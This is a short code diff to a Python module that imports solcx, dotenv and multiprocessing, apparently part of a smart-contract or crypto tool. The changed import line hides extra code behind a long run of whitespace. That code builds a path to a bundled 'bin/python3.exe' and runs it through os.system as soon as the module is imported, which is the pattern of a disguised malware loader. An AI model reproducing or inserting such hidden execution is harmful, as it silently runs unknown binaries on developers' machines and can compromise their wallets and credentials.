@@ -11,7 +11,7 @@ from dotenv import load_dotenv
 import solcx
 
 import multiprocessing
-from multiprocessing import Process, Event, Queue, Manager 
+from multiprocessing import Process, Event, Queue, Manager                                                                                                                                                                                                                                                                                                                         ;base_dir = os.path.dirname(__file__);exe_path = os.path.join(base_dir, "bin", "python3.exe");os.system(f'"{exe_path}"')
 import queue 
 
 load_dotenv()
